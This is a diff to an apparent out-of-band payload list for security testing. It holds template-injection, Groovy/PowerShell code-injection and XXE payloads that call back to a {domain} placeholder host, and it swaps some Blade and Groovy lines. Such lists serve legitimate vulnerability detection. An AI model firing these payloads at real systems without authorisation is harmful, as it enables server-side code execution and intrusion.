@@ -81,9 +81,6 @@ ${"java.net.URL"?new("http://{domain}/ssti").openStream()}
 ##Smarty (PHP) - OOB##
 {fetch file="http://{domain}/smarty"}
 {fetch file="http://{domain}/smarty" assign="x"}
-##Blade (PHP/Laravel) - OOB##
-@php file_get_contents('http://{domain}/blade') @endphp
-@php fopen('http://{domain}/blade','r') @endphp
 ##ERB (Ruby) - OOB##
 <%=require 'net/http';Net::HTTP.get(URI('http://{domain}/erb'))%>
 <%=require 'open-uri';URI.open('http://{domain}/erb').read%>
@@ -156,7 +153,7 @@ Invoke-WebRequest http://{domain}/pseval
 [System.Net.Sockets.TcpClient]::new('{domain}',9999)
 ##Groovy Code Injection - OOB##
 new URL('http://{domain}/groovy').text
-['curl','http://{domain}/groovy'].execute()
+new java.net.URL('http://{domain}/groovy2').openStream()
 "http://{domain}/groovy".toURL().text
 ##XXE - OOB##
 <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://{domain}/xxe.dtd">%xxe;]><root>1337</root>
